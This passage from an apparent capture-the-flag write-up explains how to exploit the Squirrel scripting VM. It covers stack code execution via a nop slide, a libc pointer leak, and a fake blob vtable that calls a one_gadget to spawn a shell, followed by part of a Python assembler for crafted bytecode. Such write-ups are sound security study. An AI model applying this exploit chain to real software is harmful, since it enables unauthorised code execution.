\llap{$\rightarrow$\hspace{50pt}} x = \pm\sqrt{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">n</span></span></span></span><span class="vlist-s">&#x200B;</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">&#x2032;</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">&#x2212;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.7935600000000003em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">n</span></span></span></span><span class="vlist-s">&#x200B;</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.402978em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">&#x2032;</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mop op-limits"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.152978em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">=</span></span></span><span style="top:-3.5668699999999998em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mclose mtight">!</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.36687em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="llap"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="inner"><span class="mord"><span class="mord text"><span class="mrel">&#x2192;</span><span class="mspace" style="margin-right:5em;"></span></span></span></span><span class="fix"></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.190845em;"></span><span class="mord">&#xB1;</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491550000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">n</span></span></span><span style="top:-2.809155em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">&#x200B;</span></span><span class="vlist-r"><span class="vlist" style="height:0.190845em;"><span></span></span></span></span></span></span></span></span></span></p>
<p>I use a step size of 40 in my code, because <code>I fucked up somewhere in the offset calculation</code> and 40 seems to work for the Docker image.</p>
<p>By loading the code somewhere later into the stack and before that a <code>big nop slide</code>, code on the stack can be executed. So basically the classic <code>jmp esp</code>, but in squirrel. But how to get back? I ended up using <code>traps</code>, since they save the stack base and the instruction pointer location. On the stack all that is needed is to <code>throw an exception to get back</code> into a &quot;normal&quot; state.</p>
<h3 class="mume-header" id="how-to-shell">How to shell</h3>

<p>On linux the system function is compiled into the binary even though it is not registered.I can&apos;t just use <code>system(&quot;sh&quot;)</code> in squirrel, but if I create a native closure with the <code>_function</code> pointer pointing to <code>_system_system</code> I can call that native closure to get a shell. I would need to leak a pointer pointing somewhere inside the <code>sqstdlib</code> library and could then calculate the address of <code>_system_system</code> based on the docker setup. But I decided to try to exploit it without the <code>_system_system</code> since that would require &quot;remote information&quot; which I avoided to this point.<br>
I decided that a <code>libc leak</code> would be okay, since <code>libc-db</code> can be used to get the version and use it to calculate the offset. I could also have used a pattern scan and then no offset would be needed, but <code>I left implementing that as an exercise for the reader</code>.</p>
<p>I ended up using a <code>vtable</code> of a fake <code>blob</code> instead of <code>_function</code> since I can control the arguments in <code>self-&gt;Write</code> used in <code>_stream_writen</code></p>
<pre data-role="codeBlock" data-info="CPP" class="language-cpp">SQInteger <span class="token function">_stream_writen</span><span class="token punctuation">(</span>HSQUIRRELVM v<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">SETUP_STREAM</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
    SQInteger format<span class="token punctuation">,</span> ti<span class="token punctuation">;</span>
    SQFloat tf<span class="token punctuation">;</span>
    <span class="token function">sq_getinteger</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token string">&apos;l&apos;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        SQInteger i<span class="token punctuation">;</span>
        <span class="token function">sq_getinteger</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ti<span class="token punctuation">)</span><span class="token punctuation">;</span>
        i <span class="token operator">=</span> ti<span class="token punctuation">;</span>
        self<span class="token operator">-&gt;</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>SQInteger<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
</pre><p>That is perfect for a <code>one_gadget</code> just a libc pointer leak is needed. By allocating <code>a big chunk</code> on the heap, a libc pointer is <code>placed directly after the chunk</code> and therefore can be leaked.<br>
To create the <code>fake blob</code> I used a blob, because it is easy to write data to it and the object address can be leaked using <code>tostring</code>. Using that address and the offset to the blob data, I can write a fake <code>instance</code> pointing to the fake <code>blob</code> and move it on the squirrel stack, to execute <code>writen</code> and spawn a shell.</p>
<h2 class="mume-header" id="code">Code</h2>

<p><strong>assembler:</strong></p>
<pre data-role="codeBlock" data-info="py" class="language-python"><span class="token keyword">import</span> struct

<span class="token keyword">from</span> sqdef <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> common <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">parse_assembly</span><span class="token punctuation">(</span>assembly<span class="token punctuation">)</span><span class="token punctuation">:</span>
    instructions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> assembly<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> data <span class="token keyword">and</span>  data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">&quot;#&quot;</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;a0:&quot;</span><span class="token punctuation">)</span>
            op <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> op <span class="token keyword">in</span> name2op<span class="token punctuation">:</span>
                op <span class="token operator">=</span> name2op<span class="token punctuation">[</span>op<span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;UNKNOWN instruction: %s&quot;</span> <span class="token operator">%</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>
            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;a1:&quot;</span><span class="token punctuation">)</span>
            a0 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;a2:&quot;</span><span class="token punctuation">)</span>
            a1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;a3:&quot;</span><span class="token punctuation">)</span>
            a2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
            a3 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
            instructions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>SQInstruction<span class="token punctuation">(</span>op<span class="token punctuation">,</span>a0<span class="token punctuation">,</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">,</span>a3<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> instructions

<span class="token keyword">class</span> <span class="token class-name">SQFile</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>pos <span class="token operator">=</span> <span class="token number">0</span>

    <span class="token keyword">def</span> <span class="token function">assemble</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>main<span class="token punctuation">,</span>rawdata<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;\xFA\xFA&apos;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;RIQS&apos;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write_function<span class="token punctuation">(</span>main<span class="token punctuation">,</span>data<span class="token operator">=</span>rawdata<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;LIAT&apos;</span><span class="token punctuation">)</span>


    <span class="token keyword">def</span> <span class="token function">write_object</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>t<span class="token punctuation">,</span>o<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;I&quot;</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>o<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>o<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_INTEGER&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span>o<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_BOOL&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">if</span> o <span class="token keyword">else</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> t <span class="token operator">==</span> tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_FLOAT&apos;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;f&quot;</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">write_function</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>fun<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>fun<span class="token punctuation">.</span>sourcename<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>fun<span class="token punctuation">.</span>function_name<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>literals<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>parameters<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>outervalues<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>localvarinfos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>lineinfos<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">16</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>defaultparams<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>instructions<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fun<span class="token punctuation">.</span>functions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>


        <span class="token keyword">for</span> x <span class="token keyword">in</span> fun<span class="token punctuation">.</span>literals<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        
        <span class="token keyword">for</span> x <span class="token keyword">in</span> fun<span class="token punctuation">.</span>parameters<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>


        <span class="token keyword">for</span> x <span class="token keyword">in</span> fun<span class="token punctuation">.</span>outervalues<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;Q&quot;</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>tmap<span class="token punctuation">[</span><span class="token string">&apos;OT_STRING&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> x <span class="token keyword">in</span> fun<span class="token punctuation">.</span>localvarinfos<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write_object<span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;QQQ&quot;</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fun<span class="token punctuation">.</span>lineinfos<span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fun<span class="token punctuation">.</span>defaultparams<span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b&apos;TRAP&apos;</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> ins <span class="token keyword">in</span> fun<span class="token punctuation">.</span>instructions<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>write<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;iBBBB&quot;</span><span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg1<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>op<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg0<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg2<span class="token punctuation">,</span>ins<span class="token punctuation">.</span>arg3<span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> x <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
